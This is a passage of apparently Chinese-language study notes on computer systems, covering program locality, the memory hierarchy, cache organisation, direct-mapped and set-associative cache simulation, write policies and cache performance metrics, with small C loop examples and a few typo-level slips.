class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sum_array1</span><span class="params">(<span class="type">int</span> a[M][N])</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; M; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; N; j++)</span><br><span class="line">            sum += a[i][j];</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sum_array2</span><span class="params">(<span class="type">int</span> a[M][N])</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; N; j++)</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; M; i++)</span><br><span class="line">            sum += a[i][j];</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们考虑对数据的引用，<strong>回忆 6.1 中对于 Nested Array 的内存排列的知识</strong>，数组数据连续排列且<strong>行优先</strong>，所以我们发现，使用 <code>sum_array2</code> 方式遍历数组，其<strong>数据相距距离很远</strong>，这意味着程序的局部性差于 <code>sum_array1</code>。而事实上，<code>sum_array2</code> 也真的会比 <code>sum_array1</code> 慢一个数量级；</p><blockquote><p>例题：请修改以下代码，使得它满足 stride-1 reference pattern（即更优的程序局部性）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sum_array_3d</span><span class="params">(<span class="type">int</span> a[M][N][N])</span> &#123;</span><br><span class="line"> <span class="type">int</span> i, j, k, sum = <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; M; i++)</span><br><span class="line">     <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; N; j++)</span><br><span class="line">         <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; N; k++)</span><br><span class="line">             sum += a[k][i][j];</span><br><span class="line"> <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><h2 id="10-3-Conclusions-for-10-1-amp-10-2"><a href="#10-3-Conclusions-for-10-1-amp-10-2" class="headerlink" title="10.3 Conclusions for 10.1 &amp; 10.2"></a>10.3 Conclusions for 10.1 &amp; 10.2</h2><p>没错，前面两节全部在为存储系统的层次结构<strong>做准备</strong>，之后我们才开始正式讨论 Memory Hierarchy。在此之前，我们先小总结一下前面的内容。</p><p>在本章开始，我们认识了计算机存储系统在硬件层面的两大组成：主存和外存。主存由 RAM（又分为 SRAM 和 DRAM）组成；外存则是硬盘（又分为机械硬盘、SSD）、可移动磁盘为主。</p><blockquote><p>广义的内存包括：主存（RAM）、全部 ROM、Cache（高速缓存存储器）；</p></blockquote><p>我们紧接着比较了 SRAM 和 DRAM 的特征、异同，以及它们所使用的场合；对于 ROM，我们了解了不同的 ROM 类型，还有闪存的定义。</p><p>在外存方面，我们详细介绍了机械磁盘的物理结构（磁盘控制器、盘面、柱面、磁道、扇区、记录区、承载量计算、访问耗时分析、逻辑块），并类比出功能相同、实现不同的固态硬盘物理结构（闪存翻译层、页、块）。</p><p>于是，我们从上面存储介质的物理结构中分析并得出 <strong>其数据访问模式的性能限制和优劣</strong>。</p><p>最后，我们分析了 <strong>CPU 访问主存</strong> 和 <strong>CPU 访问外存</strong> 的情况和流程，从中我们得知了在内存读取的流程中也存在着性能的限制或者说损失。</p><p>基于这些物理结构的限制，我们讨论出代码结构层面能够在一定程度上弥补这些性能鸿沟的性质：<strong>局部性</strong>。我们根据 <strong>存储设备的物理结构</strong> 和 <strong>数据存放的方式</strong>，可以设计写出更符合程序局部性的代码，这在一定程度上可以缓解 CPU 和内存之间访问的性能差距。</p><p>而观察代码的局部性，就需要对数据在内存中的 layout，还有储存设备的工作原理有一个很好的认识，这就是前几章、前几节的内容。</p><p><strong>这些存储介质的物理特性，和程序的局部性相辅相成，相得益彰，为人们提供一种 “怎样设计存储系统” 的建议和信息。</strong></p><p>接下来，我们将基于这些存储介质的物理性质，讨论在其上所建立的层次结构，和这些层次结构是如何抽象硬件，尽可能地为上层的计算机软件提供更连续完整的资源的。</p><h2 id="10-4-Memory-Hierarchy-amp-Idea-of-Caching"><a href="#10-4-Memory-Hierarchy-amp-Idea-of-Caching" class="headerlink" title="10.4 Memory Hierarchy &amp; Idea of Caching"></a>10.4 Memory Hierarchy &amp; Idea of Caching</h2><p>下图是计算机存储系统的一个层次结构图。</p><p>其中，寄存器是访问速度最快的存储结构，它在每个 CPU 时钟周期内都可以直接访问到（大小最小、数量很少、价格最贵、速度最快）；</p><p>接下来的是由 SRAM 组成的高速缓存存储器（Cache Memory），也处于 CPU 芯片内部，既不是主存，也不是寄存器；大小虽然是 MB 级，但已经比寄存器大多了。其中 3 层 Cache Memory 的具体结构将在下一章进行深入讨论；</p><p>再向下是 DRAM 组成的计算机的主存，一般你能看到的 “内存条” 就是它的组合结构，也是普通人经常说的 “内存”（狭义内存），一般从几个 G 到 几十 G 不等，程序运行内存（或者说后面要提到的<strong>虚拟内存</strong>）就是它的一部分；</p><p>最底层的像本地硬盘结构，甚至云端存储结构，空间一般都很大，但访问效率低下。</p><p><img src="imgs/memory_hierarchy_example.png" height="400px"></p><p><strong>设计的核心：在 Memory Hierarchy 中，每一层都包含着从下一层所检索的数据</strong>（例如 CPU 寄存器保存着从 L1 高速缓存中取出的数据，依此类推）；</p><p>这样设计的原因是为了充分利用各个层级资源的特征，将整体数据访问效率最大化（<strong>底层是极大的数据池，却能够以极快的速度进行访问</strong>）。</p><p>这么做之所以有效，是因为 <strong>缓存思想（Caching）的存在</strong>。</p><p>这里所说的缓存，<strong>不是高速缓存存储器（Cache memories），而是一种思想</strong>。<strong>作为一个更小、更快的存储设备，充当更慢设备中数据的暂存区域、能更快访问的数据子集</strong>。例如，主存 可以看成是本地硬盘的 缓存，这样一旦从磁盘获取数据，就无需在磁盘上访问它，在上一个层级内存中访问，速度得到提升。依此类推，<strong>缓存的思想在 Memory Hierarchy 中逐级传播</strong>。</p><blockquote><p>第 k 层更快、更小的存储设备，就是第 k+1 层更慢、更大存储设备的 缓存。</p></blockquote><p>在真实场景中，每当程序访问一个不在缓存设备（第 k 层）中的数据，都会从第 k+1 层检索，并复制到第 k 层缓存起来。这是因为，<strong>根据程序的局部性</strong>，相较于第 k+1 层的设备，会更经常访问第 k 层设备中的数据，这就是 Memory Hierarchy 能最大化数据访问效率的原因。</p><hr><p>在详细介绍高速缓存存储器（狭义的 Cache）前，我们简单介绍一下<strong>缓存的实现</strong>，因为缓存思想存在于存储层次结构的每一层。</p><p><img src="imgs/general_cache_concept.png" height="240px"></p><p>储存数据的下层设备的空间（k+1 层）通常被分为一个个固定大小的块（blocks），缓存设备和下层设备间传输的数据以块为单位进行。</p><blockquote><p>如果第 k+1 层是 Web 云端存储介质，那么 blocks 通常以文件形式传给磁盘（第 k 层，缓存设备）；</p><p>如果第 k+1 层是主存，那么 blocks 可能是以某个特定大小的数据块传给高速缓存存储器（第 k 层，缓存设备）；</p><p>……</p></blockquote><p>在任意时间点，第 k 层的缓存设备中的数据都是第 k+1 层设备数据的一个子集。</p><p>对于 CPU 请求一个位于第 k+1 层的某个位置的数据这种情况，则 CPU 会先去层级最高的设备中寻找（假设找到第 k 层），则有两种情况：</p><ul><li><p>如果恰好找到了（假设请求如下图绿色块 14 的数据），那么 CPU 就直接从缓存（第 k 层）中读走这个数据，无需向下请求数据，总体提升了效率。这种情况称为 <strong>Cache Hit</strong>（缓存命中）；</p><p><img src="imgs/cache_hit.png" height="240px"></p></li><li><p>如果没有找到，那么 CPU 就需要从更下一层取得此数据块，并<strong>将它存放在缓存设备中</strong>。这种情况称为 <strong>Cache Miss</strong>（缓存不命中）；其本身又分为 3 个类型：</p><ul><li><p>Cold（compulsory）Miss：缓存为空，所以 Miss，不可避免；</p></li><li><p>Capacity Miss：由于较小的缓存空间而导致的不命中，通常是因为程序的工作集大于缓存空间所致。可以由增大缓存空间而减少；</p><blockquote><p>工作集（working set）：当前不断被程序访问的块，也即活跃的缓存块（active cache block）；</p></blockquote></li><li><p>Conflict Miss：由于大部分缓存设备（尤其硬件缓存）必须设计的比较简单，它限制了缓存块的放置位置（例如第 i 块必须放在 <code>i mod sizeof(Cache)</code> 的位置，很类似 hash table 的碰撞），这与缓存实现方式有关，也在下一章进一步讨论；</p></li></ul><p><img src="imgs/cache_miss.png" height="240px"></p></li></ul><p>最后，我们总结一下缓存在存储系统各层级的实现情况：</p><p><img src="imgs/caching_in_hierarchy.png" height="400px"></p><blockquote><p>注：TLB（Translation Lookaside Buffer，后备缓冲）是一个在虚拟内存中使用的缓存，<strong>是虚拟地址翻译为物理地址的翻译过程的缓存</strong>；</p></blockquote><p>需要注意的是，<strong>各个层级的缓存究竟是由谁实现和管理的</strong>，这是缓存思想的一个重点，也能解释早在第 3 章的疑问——<strong>汇编代码中找不到管理高速缓存存储器的代码</strong> 的原因。</p><p>例如，当寄存器看作缓存设备时，是编译器决定用哪个寄存器、用多少个寄存器（怎么用的 conventions 是 ABI 决定的）；</p><p>综上，缓存思想存在于计算机系统的几乎每个用到数据 I/O 的地方。</p><p>下一章将讨论 Memory Hierarchy 中一个具体的部分 <strong>高速缓存存储器</strong>，来深入了解缓存思想。</p><h1 id="Chapter-11-Cache-Memories"><a href="#Chapter-11-Cache-Memories" class="headerlink" title="Chapter 11. Cache Memories"></a>Chapter 11. Cache Memories</h1><blockquote><p>本章讲述 Memory Hierarchy 缓存思想中的重要一个体现：高速缓存存储器（Cache memories），它介于寄存器和内存之间，充当缓存设备的角色。</p></blockquote><p>回忆上一章的内容，高速缓存器本质上是一种由 SRAM 组成的、由硬件直接管理的小型缓存存储设备：<strong>Cache memories are small, fast SRAM-based memories managed automatically in hardware</strong>.</p><p>它一般封装于 CPU 芯片中，几乎和寄存器距离 CPU 核心同样近（只是由于电路存取特性导致其慢于寄存器），存储主存中被频繁引用的数据块。</p><h2 id="11-1-General-Cache-Organization"><a href="#11-1-General-Cache-Organization" class="headerlink" title="11.1 General Cache Organization"></a>11.1 General Cache Organization</h2><p>那么硬件是如何管理高速缓存存储器中的数据，在 CPU 需要的时候进行寻找呢？我们首先需要借鉴<strong>层次架构中一般的缓存模型</strong>，它们共同有一种缓存的管理方式和 layout；</p><p>首先，缓存本身就需要极速，这意味着设计缓存机制必须<strong>以非常严格且简单的方式去组织缓存模型</strong>，便于各个设备层级间进行查找。于是人们设计了下面的缓存数据组织形式：</p><p><img src="imgs/general_cache_organization.png" height="350px"></p><p>缓存空间中一般包含 $S=2^s$ 个数据组（set），每一组又包含 $E=2^e$ 个数据行（line，图中<strong>横着排列</strong>），每一数据行由大小为 $B=2^b$ bytes（B binary digits）的数据区块和一个 tag 区、一个 valid bit 组成；现在解释一下目前可能有的疑惑：</p><ul><li>valid bit 指示当前缓存数据行中的数据实际上也真实存在于下层的存储介质中，可以直接使用（例如第一次打开机器的时候，这些数据区块位置上是随机 bits，因此这些 valid bit 会提示数据区块无效）；</li><li>tag 位（标记位）编码了这串数据位于下层存储介质的位置，在 CPU 搜索时有用；</li><li>为何无论是组数、数据行数还是每个数据行中的字节数都是 2 的幂次呢？<strong>这是一个非常重要的点。因为，缓存空间按照 内存地址的数码的各个位 来直接对应该内存数据应该存放的位置</strong>。这个比较抽象，后面的例子就会慢慢理解。</li></ul><p>其中高速缓存块的大小 <u>不包含 Tag 和 valid 部分</u>，也就是说，高速缓存的大小 $C=S\times E\times B$；</p><h2 id="11-2-Read-Cache"><a href="#11-2-Read-Cache" class="headerlink" title="11.2 Read Cache"></a>11.2 Read Cache</h2><p>那么缓存是如何被读取的？详细数据结构（和具体存储设备有关）又是什么样子的？</p><p>实际上，程序在运行中可能请求了下层存储介质中某个位置的数据，我们<strong>以高速缓存存储器和主存间查找数据的关系为例</strong>。步骤如下：</p><ul><li>假设程序指令要求引用主存中虚拟内存的某个地址（设为 <code>X</code>）的数据，那么 CPU 会向高速缓存存储器请求 <code>X</code> 地址下的值；</li><li>这个请求的地址会被 高速缓存存储器 <strong>直接用来查找缓存存放的位置（即这个地址的数据存放在）</strong>。其中 <code>X</code> 会被 高速缓存存储器 <strong>解析成</strong>如下图所示的结构（<strong>这就是为什么上面的 <code>S</code>、<code>E</code>、<code>B</code> 都是 2 的幂</strong>。看着这张图你能想明白吗？还不能明白的话，后面会有更具体的例子）：</li></ul><p><img src="imgs/addr_B.png" height="125px"></p><ul><li>高速缓存存储器 <strong>首先 extract <code>X</code> 中 s bits 的 <code>set index</code></strong>（缓存组索引）看作为 unsigned int，用它找到缓存空间中特定的组（和数组索引很像）；</li><li>高速缓存存储器 接着<strong>并行检查（依赖于硬件电路的检查机制）</strong>该组中所有的数据行，将 tag 字段与每个数据行中的 tag 进行比较。如果找到了相同的 tag，那么再检查 valid bit 是否指示有效。所以会出现以下情况：<ul><li><strong>情况一</strong>：该组的数据行中不存在 tag 与 <code>X</code> 一致的行，<strong>说明请求的数据块不在缓存中（Cache miss）</strong>；</li><li><strong>情况二</strong>：该组的数据行找到了 tag 与 <code>X</code> 一致的行，但 valid bit 指示无效，<strong>说明请求的数据块无效，当前也不在缓存中（Cache miss）</strong>；</li><li><strong>情况三</strong>：该组的数据行找到了 tag 与 <code>X</code> 一致的行，并且 valid bit 指示有效，<strong>Cache hit</strong>！</li></ul></li><li>如果是 cache hit，那么<strong>extract</strong> <code>X</code> 中 b bits 的 <code>block offset</code>，从该数据行的数据区块开头地址加上这个 offset，将得到的地址再数据行中剩余部分规定大小读出，直接传给 CPU，结束查找过程；</li><li>如果是 cache miss，那么高速缓存存储器会放弃查找，将原本的请求地址 <code>X</code> 传给下一级存储设备（主存），那么查找工作交给主存（重复上面类似的步骤）。<strong>注意，当主存找到数据向上提交时，再次给到高速缓存存储器</strong>，将数据放在高速缓存存储器的应该是 <code>X</code> 的位置<strong>缓存起来</strong>（通常会覆盖相同位置的其他数据），然后高速缓存存储器再将数据向上提交给 CPU；</li></ul><p>总体呈现出 <strong>“逐层向上缓存数据，逐层向下查找数据”</strong> 的形式。</p><h3 id="11-2-1-Direct-Mapped-Cache-Simulation"><a href="#11-2-1-Direct-Mapped-Cache-Simulation" class="headerlink" title="11.2.1 Direct-Mapped Cache Simulation"></a>11.2.1 Direct-Mapped Cache Simulation</h3><p>下面详细解释上面的步骤。为了便于理解，我们首先从简单的情况讨论，<strong>当每一个缓存组只包含一个数据行的情况，这种情况被称为 “直接映射”（Direct-Mapped Cache Simulation）</strong>：</p><p>假设某个机器的内存空间大小 M = 16 bytes（可以用 4-bit digit 代表地址），缓存空间中含有 4 个组（S = 4），每个组含有一个数据行（E = 1），每个数据行含有 2 bytes 的数据区块（B = 2）。</p><p>在数据区块中，block offset 的长度为 1 byte（b = 1，因为数据区块只有 2 bytes，一般有 $B=2^b$），set index 的长度为 2 bytes（s = 2，因为缓冲区只有 4 组数据组，有 $S=2^s$）；</p><p>现在程序开始运行的时候，分别请求内存地址（$X$）为 0、1、7、8、0 的 1 byte 数据；</p><p>现在，高速缓存存储器中的所有数据行的 valid bit 都是 0（假设 0 代表无效，1 代表有效），并且开始接受 CPU 请求内存地址 $X = 0 = 0000_2$ 的数据 的请求。</p><p>首先，$X$ 的 block offset <strong>就是中间 2 bit</strong>，<code>00</code>，所以在 <code>set 0</code>（第 0 组）中寻找；然后，将 $X$ 的 tag 位（即最左边的 1 bit，0）与 <code>set 0</code> 的 tag 比较（是随机数），再看 valid bit 是 0，所以 cache miss（cold miss），如下动画（本人不会 Acrobat Animate，比较粗糙）：</p><p><img src="imgs/directMappedCacheSimulation_part1.gif"></p><p>思考两个问题，第一个，为什这里的 tag 是 0 ？这是因为，我们在给定的 set offset 下（组相同），前面的 t bit（t=1）的 tag 位<strong>只是用来区分数据行</strong>的，<strong>借助了原内存地址 <code>X</code> 的前 t bits 数据</strong>而已，没有实际意义。</p><p>第二个，为什么这里要从 main memories 中同时读入 0、1 地址的数据？也就是说，为什么设定 <code>B == 2</code> 呢？<strong>这是因为，除去 set offset 的 2 bits、tag 的 1 bit，剩下内存地址 <code>X</code> 数码还有 1 bit 留给 block offset</strong>，因此 <code>X</code> 只能在该组的数据行中索引 2 bytes 的数据。</p><p>细细体会上面的话，你会发现这就是缓存空间如此设置、<code>X</code> 如此解析的原因（这里设计的和 IEEE 浮点数表示法一样巧妙，不容易用语言描述）。</p><hr><p>好了，又有同学会好奇了，既然这些索引本身没有意义，只是借助了原地址的数码，<strong>那为什么设计缓存索引的人一定要 <code>set index</code> 在中间、tag 在最前面、block index 在最后面呢</strong>？</p><p>这个问题非常有水平，这和<strong>二进制数码的变化方式有关</strong>。我们这里就分析对比 2 种解释 <code>X</code> 地址的方式：</p><ul><li>Middle Bits Indexing：就是上面的 <code>X</code> 的结构，Tag 在前、<code>Set index</code> 在中间、<code>Block index</code> 在最后；</li><li>High Bits Indexing：<code>Set index</code> 在前、Tag 在中间、<code>Block index</code> 在最后；</li></ul><p>我们接下来<strong>将缓存空间的组标为不同颜色，再把内存中将要分配到哪一组的数据块填上相同的颜色</strong>，发现结果如下：</p><p><img src="imgs/middle_bits_indexing.png" width="360px"><img src="imgs/high_bits_indexing.png" width="360px"></p><p>我们发现，<strong>如果用 high bits indexing，那么内存地址相近的内存区域很容易被分配到相同的缓存组中，根据<u>空间局部性</u>，这样做会导致发生 conflict miss 的概率大大增加</strong>。所以，在缓存效率上，middle bits indexing 是优于 high bits indexing 的。其他情况同理。</p><p>这就是设计者们为什么要如此设计内存地址 <code>X</code> 在缓存中的这种解析方法。</p><hr><p>继续看接下来的过程动画：</p><p><img src="imgs/directMappedCacheSimulation_part2.gif"></p><p>我们发现，5 次访问中，有<strong>高达 4 次的 cache miss</strong>。后面 2 次的 cache miss 都是 conflict miss，完全能够由 提高每组的数据行数（<code>E</code> 的大小）来避免。<strong>因此，缓存结构中 <code>E</code> 的大小越大越好（也就是每组中的数据行越多越好）</strong>。但是我们前面提到，一个组中各个数据行<strong>使用并行比较</strong>，这个操作依赖硬件的多路判断——<strong>也就是说，<code>E</code> 越大，硬件电路越复杂，硬件越贵</strong>。所以真实计算机硬件中会进行取舍，选择一个特定的 <code>E</code> 值。</p><blockquote><p>当代（21 世纪初）市面上的常见的单组中数据行数目取值 <code>E = 8</code>，最大有 <code>E = 16</code>，是 Intel 的 16 路相联 L3 三级缓存。</p></blockquote><p>事实上，<code>B</code>（数据区块的大小，block size）也是越大越好，因为越大越可以利用局部性，提升缓存命中概率。但 <code>B</code> 受限于<strong>两个因素</strong>：一是<strong>硬件成本</strong>（例如 Cache memories 由 昂贵的 SRAM 组成），二是<strong>块复制的时间代价</strong>，因为如果想要把很大的数据区块从内存挪至缓存中，也是一个不小的开销。</p><p>综合上面的考虑，设计者真正确定缓存空间各个参数的步骤如下：</p><ol><li><strong>确定合适的数据区块（就是在数据行中的那个字段）大小 <code>B</code></strong>（通常被称为<strong>固定的缓存高级设计参数</strong>。Intel 一般 64 bytes）；</li><li>根据实际应用场景和硬件成本情况<strong>确定大致的缓存空间总大小</strong>（也是固定的缓存高级设计参数之一）；</li><li>根据硬件和实际情况<strong>确定数据组的关联性（associativity，即一个数据组中有多少数据行）<code>E</code></strong>；</li><li>由 1、2、3 就能计算出大致的<strong>缓存数据组数（<code>S</code>）</strong>。</li></ol><blockquote><p>最极端的情况是 <strong>全相关联高速缓存（Fully Associative Caches）</strong>，缓存空间中只有一个组（<code>S = 1</code>，所有数据行在一个组中），这个时候如果能够并行比较，那么缓存效率是极高的。但是通常由于上述原因，我们大多数时候只能在<strong>软件级别的缓存 或者 在主存和硬盘之间的缓存模式（因为硬盘读取时间开销很大，值得我们使用复杂算法来获得更高的缓存效率，我们在“虚拟内存”一章会讨论）</strong>中找到这种组织形式。</p></blockquote><h3 id="11-2-2-E-Way-Set-Associative-Cache-Simulation"><a href="#11-2-2-E-Way-Set-Associative-Cache-Simulation" class="headerlink" title="11.2.2 E-Way Set Associative Cache Simulation"></a>11.2.2 E-Way Set Associative Cache Simulation</h3><p>除了直接映射，还有一个稍微复杂点的例子，<strong>当不改变上面例子中的缓存空间大小，讨论每个缓存组包含 2 个数据行的情况，这也被称为 “2-Way Set Associative Cache（2 路相连高速缓存）Simulation”</strong>。</p><p>这个时候 tag 变为 2-bit，set index 变为 1-bit，block index 还是 1-bit；</p><p>我们有类似上面 Directed-Mapped Cache Simulation 相近的步骤，如下图：</p><p><img src="imgs/2_way_associative_cache_sim.png" height="300px"></p><blockquote><p>注意到一点，当关联性大于 1 的时候，同一个数据组中可能不同的数据行的 tag 可能是相同的，那么当我们想要覆盖数据的时候，就涉及到了<strong>选择覆盖</strong>的问题，它可以通过设计算法来完成。</p><p>根据<strong>局部性原理的逆定理（通常成立）</strong>，如果一个数据长时间不被引用，那么它在未来的某个时间也不太可能被引用。所以，最常见的算法是 <strong>“最近最少使用” 策略（Least Recently Used Strategy）</strong>，这种算法一般不需要额外的 bit 存储数据，只是从硬件层面跟踪在缓存中数据的使用频率（如按序保存虚拟时间戳），确保无效的数据行最先被覆盖，然后是使用频次更低的数据先被覆盖。</p></blockquote><p>助记：</p><ul><li><code>b</code> 位不同，<code>s</code>，<code>t</code> 位相同，也位于同一个组中；</li><li>每 $2^{b+s}$ bytes 就排在同一个组内；</li></ul><h2 id="11-3-Write-Cache"><a href="#11-3-Write-Cache" class="headerlink" title="11.3 Write Cache"></a>11.3 Write Cache</h2><p>事实上，真正要更改某些数据恐怕比读数据更难，因为我们的缓存机制通常会产生多份数据的复制品。例如层级从低到高：硬盘、主存、L1 / L2 / L3 高速缓存，其中可能包含了同一份数据的副本。</p><p>于是在程序要求修改内存（仍然以 高速缓存存储器 和 内存 这对存储同样有 2 种情况 <strong>write-hit</strong> 和 <strong>write-miss</strong>：</p><p>如果遇到 <strong>write-hit</strong>（要写的内存数据就在缓存设备中）的情况，由于数据分布特殊性，那么有两种处理方法：</p><ul><li><p><strong>Write-through</strong>：立即将数据写入缓存（即覆盖当前行）并主动刷新（flush）到内存；</p><ul><li>优势：内存始终是缓存的镜像，二者数据同步；</li><li>劣势：从 CPU 到 内存，时间开销必然很大；</li></ul></li><li><p><strong>Write-back</strong>：先把数据写入缓存，但不立即刷新，直到下一个数据要覆盖这个数据行的时候，才更新到内存中（defer write to memory until replacement of line，<strong>只是尽可能推迟了写入内存的时间</strong>）；</p><ul><li><p>优点：如果数据的 dirty bit 指示没有被污染时，那么覆盖这一行就不用执行 write 操作；</p></li><li><p>特点：<strong>这种方法需要一个标记（dirty bit），用来指示当前数据和内存中是否相同，即是否有被修改过</strong>；</p><p><img src="imgs/dirty_bit.png" height="100px"></p></li><li><p>劣势：必然存在 <strong>write-miss</strong> 现象，因为如果修改的内存数据不在缓存中，那么就需要与内存交互；</p></li></ul></li></ul><p>如果遇到的是 <strong>write-miss</strong>，那么也有 2 种方法（<strong>和 write-hint 是对称的操作</strong>）：</p><ul><li><strong>Write-allocate</strong>：写分配，在 write-miss 后，<strong>先将原数据从内存读入缓存，转换为 write-hit 的情况，再 write-back（仅修改缓存 + dirty bit）</strong>；</li><li><strong>No-write-allocate</strong>：直接写入内存，不加载到缓存（缓存中没有这个数据所在的数据行，因为本来就是 write-miss）；</li></ul><p>一般情况下，由于对称性，人们一般选择 “<strong>write-back + write-allocate</strong>” 或 “write-through + no-write-allocate” 的策略中的其中一对（根据实际情况）；</p><h2 id="11-4-The-Hierarchy-of-Cache-Memories"><a href="#11-4-The-Hierarchy-of-Cache-Memories" class="headerlink" title="11.4 The Hierarchy of Cache Memories"></a>11.4 The Hierarchy of Cache Memories</h2><p>讨论完了缓存读写的具体的逻辑实现，我们再来看看实际上硬件是如何对应这些实现的。同样以 高速缓存存储器 为例。<strong>到目前为止，我们都假设计算机系统中只有一个高速缓存存储器的缓存空间</strong>，但是实际上，早在前面第 8 章中就介绍了，一般计算机中有 L1、L2、L3 3 类 Cache memories。它们在硬件上是如何设置和协调的呢？</p><p>以 Intel Core i7 芯片为例，它的高速缓存层次结构如下：</p><p><img src="imgs/intel_i7_cache_hierarchy.png" height="300px"></p><p>如图，一般情况下，现代 CPU 有 4（桌面系统）/ 8 ~ 12（服务器类系统）个核，<strong>每个核可以各自并行，独立执行各自的指令流</strong>，每个处理器内核可以包含<strong>各自的</strong>通用寄存器（位于存储系统层次结构 L0）.</p><p>在其中，每个核还会有 2 种 L1 Cache。其中一种是 <strong>d-cache（data cache，1 级数据高速缓存器）</strong>，另一种是 <strong>i-cache（instruction cache，1 级指令高速缓存器</strong>）。它们的读取时延（4 个时钟周期）仅次于寄存器，正因速度和成本的关系，它们的大小非常小，只有约 32 KB；它们的关联性一般是 8 路（一个缓存组中有 8 个数据行）；</p><p>在 L1 Cache 的下一层是 L2 Cache（L1 和），只有一种联合的高速缓存器（unified cache，同时包含某个核的数据和指令的缓存），读取速度稍慢（10 个时钟周期）于 L1 Cache，也是 8 路关联性，不过大小稍微大一点，有 256 KB；</p><p>再下层的 L3 Cache 不在 CPU 的核内，是被所有核心所共享的联合高速缓存存储器。8 bytes 大小、16 路关联性，但访问时延长达 40 ~ 75 个时钟周期；</p><p><strong>它们间的关系和之前所说的各个层级的缓存设备一模一样，都是 “逐层向上缓存数据，逐层向下查找数据”</strong>。</p><p>根据这些实际的物理结构，我们考虑一下高速缓存存储器的性能和损耗情况。我们建立如下的衡量指标（Cache Performance Metrics）：</p><ul><li>Miss Rate:  cache memories 不可避免的会发生 cache miss，这就是 cache memories 性能可能产生损耗的原因之一；<ul><li>定义：缓存未命中次数 / 总访问次数（ = <strong>1 - hit rate</strong>）；</li><li>一般情况下，L1 Cache 的 未命中率在 3 ~ 10%，L2 Cache 在 1% 左右，<strong>和缓存大小紧密相关</strong>（<strong>如此低的 Miss Rate 得益于 程序局部性</strong>）；</li></ul></li><li>Hit Time：虽然有时缓存成功命中，但从缓存的数据行中传输到处理器中仍然需要时间。<ul><li>定义：从检查标志位，到 hit 直接返回 block 中的缓存数据所需时间；</li></ul></li><li>Miss Penalty：由于 Miss Rate，从内存传输到缓存和 CPU 中通常会花费更多时间；<ul><li>定义：从检查标志位，到 miss、从内存读取数据，直到数据传回 CPU 所需时间；</li><li>一般情况下从主存中读取数据大约花费 50 ~ 200 个时钟周期（如果在其他的存储系统的层次中，花费可能大得多）；</li></ul></li></ul><p><strong>事实上，这些一次两次看似影响不大的 Cache miss 和 hit，对系统性能影响相当大！数学证明表明，99% 的 hit rate 的系统性能比 97% 的 hit rate 对应的系统性能迅速 2 倍</strong>！</p><blockquote><p>主要是因为 miss penalty 很大，miss rate 的权重远大于 hit rate 的权重。因此我们通常看 miss rate 而不是 hit rate；</p></blockquote><p>那么我们分析之前的 cache 参数对性能的影响：</p><ul><li>cache 总大小影响：增大同时 <strong>提高命中率，但增加 hit time</strong>;</li><li><p>block size ($B$) 大小影响：增大同时 <strong>更能利用程序空间局部性（提升 space locality 好的程序的 hit rate），但数据行数 $E$ 会变少（temporal locality 好的程序的 hit rate 会降低），并且会提高 miss penalty</strong>；</p></li><li><p>associativity ($E$) 大小影响：<strong>降低了 conflict miss 的可能性，但是提升了比较数据行的硬件成本、增加了命中时间、增加了 miss penalty（因为 replacement 的选择也更复杂）</strong>；</p></li></ul><h2 id="11-5-Performance-Impact-of-Cache"><a href="#11-5-Performance-Impact-of-Cache" class="headerlink" title="11.5 Performance Impact of Cache"></a>11.5 Performance Impact of Cache</h2><h3 id="11-5-1-Writing-Cache-Friendly-Code-Ⅰ"><a href="#11-5-1-Writing-Cache-Friendly-Code-Ⅰ" class="headerlink" title="11.5.1 Writing Cache Friendly Code Ⅰ"></a>11.5.1 Writing Cache Friendly Code Ⅰ</h3><p>考虑上一节惊人的缓存性能的情况，我们确实应该写出一些 Cache Friendly 的代码，<strong>这是优化代码性能的一个重要方面</strong>。在分析了缓存的特性和程序局部性之后，我们可以这样来充分利用高速缓存带给程序的性能提升：</p><ul><li><p>关注<strong>经常被调用的</strong>函数中<strong>执行次数最多的内层循环</strong>的性质，积极对它进行算法层面优化；</p></li><li><p>尽量使用重复的变量引用，而不是很多的全局变量（利用了时间局部性，减少 cache miss 的可能）；</p><blockquote><p>它和 第 15. 章的 CSE 优化不冲突，后者是尽量避免 Memory Alias；</p></blockquote></li><li><p>尽量使用 stride-1 reference patterns（或者说<strong>程序循环的步长尽量小</strong>，尤其是逐个访问数组元素，这就将 cache block 的优点发挥了出来，利用了空间局部性，减小 cache miss 的可能）；</p></li></ul><p><strong>总结：我们分析缓存的组织原理和特性，是进一步定量地（如上面的指标）去体现、印证程序局部性的概念</strong>。</p><h3 id="11-5-2-The-Memory-Mountain"><a href="#11-5-2-The-Memory-Mountain" class="headerlink" title="11.5.2 The Memory Mountain"></a>11.5.2 The Memory Mountain</h3><p>之前简单地对缓存组成的分析，让我们看到了关注缓存能够对程序带来较显著地性能影响。那么这节我们更深入地去探究缓存对程序性能的影响。</p><p>首先引入一个概念：</p><ul><li>Read throughput（吞吐量，或者说 read bandwidth，读带宽）：<strong>单位时间内从内存中读取数据的最大字节数</strong>，单位 MB/s；</li></ul><p>于是，我们可以绘制一个 <strong>时间局部性、空间局部性 关于 